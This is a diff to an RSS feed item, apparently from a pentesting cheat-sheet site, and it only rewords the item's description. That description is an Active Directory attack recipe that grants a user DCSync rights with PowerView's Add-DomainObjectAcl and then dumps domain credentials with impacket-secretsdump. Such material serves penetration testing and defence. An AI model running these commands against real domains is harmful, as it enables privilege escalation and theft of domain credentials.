@@ -54,7 +54,7 @@
       <link>https://tldrbins.github.io/writedacl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/writedacl/</guid>
-      <description>Abuse #1: Add dcsync right to user Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump Linux impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; </description>
+      <description>Abuse #1: Add dcsync right to user Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump Linux impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; </description>
     </item>
   </channel>
 </rss>
